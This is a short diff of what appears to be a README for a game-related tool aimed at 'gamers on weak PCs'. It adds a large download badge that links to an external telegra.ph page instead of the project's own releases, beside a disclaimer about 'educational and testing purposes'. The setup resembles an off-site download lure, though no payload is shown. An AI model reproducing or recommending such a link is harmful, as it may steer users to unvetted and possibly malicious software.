@@ -118,4 +118,10 @@ This tool is provided for **educational and testing purposes**. Use at your own 
 
 <p align="center">
 <a href="https://telegra.ph/TRANSITION-07-12-2">
-<img src="https://img.shields.io/badge/⬇️_GET_THE_TOOL-00C853?style=for-the-badge&logo=github&logoColor=white&la
+<img src="https://img.shields.io/badge/⬇️_GET_THE_TOOL-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=1A1A1A&color=00C853" alt="Download" width="500">
+</a>
+</p>
+
+---
+
+**Made with ❤️ for gamers on weak PCs in 2026**
